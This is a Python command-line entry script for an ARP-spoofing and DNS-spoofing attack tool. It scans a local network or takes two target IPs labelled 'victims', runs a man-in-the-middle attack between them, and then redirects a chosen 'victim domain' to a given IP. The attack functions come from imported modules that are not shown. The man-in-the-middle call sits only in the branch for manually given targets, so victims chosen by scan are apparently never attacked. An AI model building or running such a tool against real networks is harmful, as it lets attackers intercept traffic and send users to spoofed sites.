import argparse
from arp_attack.arp_attack import *
from dns_attack.dns_attack import *

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', help='Interface for network scan')
    parser.add_argument('-s', '--silent', action='store_true', help='Enable Silent mode')
    parser.add_argument('-t', '--targets', nargs=2, metavar=('ip1', 'ip2'), help='Specify two target IP addresses')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
    parser.add_argument('-vd', '--victim-domain', metavar='DOMAIN', help='Optional argument: victim domain')
    parser.add_argument('-r', '--redirected_ip', metavar='IP', help='Optional argument: redirected ip')
    args = parser.parse_args()

    interface = args.interface
    silent = args.silent
    targets = args.targets
    redirected_ip = args.redirected_ip
    victim_domain = args.victim_domain
    verbose = args.verbose

    if targets is None:
        scan_list = [Address(*x) for x in start_scan(verbose, interface)]
        victim1, victim2 = choose_victims(scan_list)
    else:
        mac1 = get_mac_address(targets[0])
        mac2 = get_mac_address(targets[1])

        victim1 = Address(mac1, targets[0], interface)
        victim2 = Address(mac2, targets[1], interface)

        mitm_attack(victim1, victim2, interface, silent)

    dns_attack(interface, redirected_ip, victim_domain, verbose)